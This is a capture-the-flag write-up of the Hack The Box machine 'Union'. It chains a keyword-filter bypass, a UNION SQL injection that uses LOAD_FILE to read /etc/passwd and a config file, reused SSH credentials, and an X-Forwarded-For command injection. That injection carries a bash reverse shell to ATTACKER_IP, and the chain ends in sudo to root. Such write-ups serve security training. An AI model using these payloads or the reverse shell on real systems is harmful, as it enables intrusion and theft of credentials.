HTB: Union

A tricky-to-find union-based SQL injection allows file reads, leaking the box's users and a database password. Those combine for SSH access. From there, www-data modifies the firewall via sudo, and a command injection in the X-Forwarded-For header gives a shell as www-data — which has full sudo rights, handing over root.

sqli filter-bypass waf-bypass command-injection sudo

Recon

A standard nmap sweep shows only SSH (22) and HTTP (80) open. The web root presents a login-style page, and digging through the page source reveals client-side filtering hints that suggest input validation is happening in JavaScript rather than the backend — always worth testing directly against the server. 

nmap -sC -sV -oA scan 10.10.11.128

Probing the login form with classic SQLi payloads gets blocked by what looks like a basic WAF, filtering common keywords. Encoding and case-mixing tricks get past it, and a UNION-based injection confirms the database is reachable.

Note The filter only blocked exact keyword matches — alternating case and inline comments (UnI/**/On SeLeCt) were enough to slip through, since the WAF wasn't normalizing input before matching.

Shell as uhc

With UNION injection confirmed, LOAD_FILE() is used to read local files from the database server, including /etc/passwd to enumerate valid users and the web application's config file to recover a database password. That password turns out to be reused for SSH, giving an initial shell as a low-privileged user. 

' UNION SELECT LOAD_FILE('/etc/passwd'),2,3-- -

Shell as www-data

Enumerating running processes and sudo rules from the uhc shell shows a script being run periodically as www-data that modifies iptables rules via sudo. Reviewing the page source of the related web app reveals the request includes the X-Forwarded-For header directly in a shell command used to add an IP-based firewall allow rule. 

curl -s http://10.10.11.128/ -H "X-Forwarded-For: 1.1.1.1; bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'"
Gotcha The header value needed careful shell-quoting to survive however the backend script interpolated it — a naive reverse shell one-liner without proper escaping silently failed instead of erroring, which made this easy to mistake for a dead end.

Shell as root

A quick sudo -l as www-data shows full, unrestricted sudo rights — likely intentional given the box's iptables-management use case, but it makes privilege escalation a one-liner. 

sudo su -

Recap of the full chain: WAF-bypassed UNION SQLi → file read leaks DB creds → reused SSH password → command injection via X-Forwarded-For → www-data → root via unrestricted sudo.
